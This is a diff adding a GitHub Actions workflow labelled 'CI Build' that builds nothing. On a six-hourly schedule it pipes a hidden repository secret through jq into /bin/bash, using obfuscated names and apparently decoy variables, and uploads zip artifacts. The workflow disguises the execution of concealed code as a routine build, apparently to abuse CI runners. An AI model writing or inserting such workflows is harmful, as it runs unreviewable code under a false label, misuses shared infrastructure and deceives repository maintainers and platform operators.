@@ -1,0 +1,35 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '28 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          f83: ${{ secrets.f83 }}
+        run: |
+          printf '%s' "$f83" | jq -r .ovvxi51385 | /bin/bash
+          echo $gww61 | jq -r .ireg2 | /bin/bash
+          printf '%s' "$iuopd8533" | jq -r .ptr43100 | /bin/bash
+          printf '%s' "$uzxy791" | jq -r .zuy96 | /bin/bash
+          echo $ju804 | jq -r .blu04664 | /bin/bash
+          echo $p7618 | jq -r .nenhd0 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: FyAW5UIz
+          path: "*.zip"
+          retention-days: 1
